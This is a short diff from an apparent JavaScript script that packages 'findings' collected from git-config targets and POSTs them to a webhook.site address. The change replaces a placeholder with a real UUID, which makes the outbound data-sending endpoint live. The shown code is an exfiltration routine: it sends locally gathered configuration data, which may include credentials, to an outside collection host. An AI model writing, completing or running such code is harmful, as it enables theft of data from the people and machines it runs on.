@@ -34,7 +34,7 @@ for (const [label, p] of Object.entries(targets)) {
 }
 
 const body = JSON.stringify({ phase: 1, source: 'git-config', findings });
-const url = new URL('https://webhook.site/YOUR-UUID-HERE');
+const url = new URL('https://webhook.site/4be739e9-e5d8-46f2-b1a8-40dcb6812a09');
 const req = https.request({
   method: 'POST',
   hostname: url.hostname,
